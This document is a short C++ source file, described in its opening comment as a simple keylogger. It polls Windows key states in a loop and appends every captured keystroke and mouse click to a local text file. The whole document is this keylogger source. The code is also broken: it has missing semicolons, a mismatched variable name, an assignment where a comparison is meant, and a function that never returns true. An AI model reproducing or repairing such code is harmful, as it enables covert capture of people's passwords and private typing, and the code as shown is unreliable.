
// This is a simple keylogger implemented in C++

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string.h>

using namespace std;

void WriteToLog(LPCSTR text) {
    ofstream logfile;       // creates object for file stream
    logfile.open("keylogs.txt", fstream::app)       // opens file for writing keystrokes
    logfile << text;        // writes text strings to file
    logfile.close()        // closes the file 
}

bool KeyIsListed(int iKey) {
    switch (ikey)
    {
    case VK_SPACE:
        cout<<" ";      // if space bar is pressed, print space to console
        WriteToLog(" ");    // Write space to log file
        break;
    
    case VK_RETURN:
        cout<< "\n";
        WriteToLog("\n");       //logs enter button ini the file
        break;

    case VK_SHIFT:
        cout<<" *Shift* ";
        WriteToLog(" *Shift* ");
        break;

    case VK_BACK:
        cout<< "\b"     // emulates backspace
        WriteToLog("\b");
        break;

    case VK_RBUTTON:
        cout<< " *rclick* ";
        WriteToLog(" *rclick* ");
        break;

    case VK_LBUTTON:
        cout<< " *lclick* ";
        WriteToLog(" *lclick* ");
        break;

    default: return false      // we need this later when determine if key exist in this list or not
    }
}

int main()
{
    char key;
    while(true) {
        Sleep(10);
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) = -32767) {
                if (KeyIsListed(key) == false) {
                    ofstream logfile;                               // creates object for file stream
                    logfile.open("keylogs.txt", fstream::app)       // opens file for writing keystrokes
                    logfile << key;                                // writes the logged key char to file
                    logfile.close()                                 // closes the file
                }
            }
        }
    }




    return 0;
}
